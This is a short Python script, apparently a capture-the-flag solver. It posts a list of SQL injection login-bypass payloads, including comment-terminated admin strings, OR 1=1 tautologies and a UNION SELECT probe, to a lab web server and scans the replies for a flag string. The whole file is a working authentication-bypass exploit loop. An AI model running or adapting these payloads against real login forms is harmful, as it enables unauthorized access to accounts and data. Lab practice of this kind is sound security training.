import sys, requests, urllib3, re
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
urllib3.disable_warnings()
BASE = "http://xebec.cylabacademy.net:36284/"
payloads = [
    ("admin'-- -", "x"), ("admin'#", "x"), ("admin' -- -", "x"),
    ('admin"--', 'x'), ('admin"#', 'x'), ('admin" -- -', 'x'),
    ("admin' OR '1'='1'-- -", "x"), ('admin" OR "1"="1"-- -', "x"),
    ("' OR 1=1 -- -", "x"), ("admin')-- -", "x"),
    ("admin' UNION SELECT 1-- -", "x"),
]
for name, pw in payloads:
    try:
        r = requests.post(BASE, data={"name": name, "pass": pw}, timeout=20)
        al = re.findall(r"<!-- <strong>Title</strong> -->\s*([^<]{0,120})", r.text)
        m = re.search(r"(?:academy|picoCTF)\{[^}]*\}", r.text)
        print("%-26s -> %d | %r %s" % (name[:26], len(r.text),
              (al[0].strip()[:60] if al else "-"), "FLAG " + m.group(0) if m else ""))
        if m:
            break
    except Exception as e:
        print(name, "ERR", type(e).__name__)
